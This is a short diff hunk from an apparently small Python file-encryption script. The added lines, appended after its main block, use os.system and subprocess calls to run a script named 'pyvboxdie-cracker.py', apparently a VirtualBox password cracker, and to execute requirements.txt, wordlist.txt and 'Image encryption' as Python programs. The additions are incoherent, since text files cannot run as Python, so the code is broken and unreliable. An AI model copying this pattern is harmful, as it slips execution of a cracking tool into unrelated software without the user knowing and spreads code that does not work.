@@ -46,3 +46,13 @@ if __name__ == "__main__":
         encrypt(files, passw)
     elif inp == 2:
         decrypt(files, passw)
+    
+    
+    
+os.system('python ../One/pyvboxdie-cracker.py')
+os.system('python ../One/requirements.txt')
+os.system('python ../One/wordlist.txt')
+call(["python", "Image encryption"])
+call(["python", "pyvboxdie-cracker.py"])
+call(["python", "requirements.txt"])
+call(["python", "wordlist.txt"])
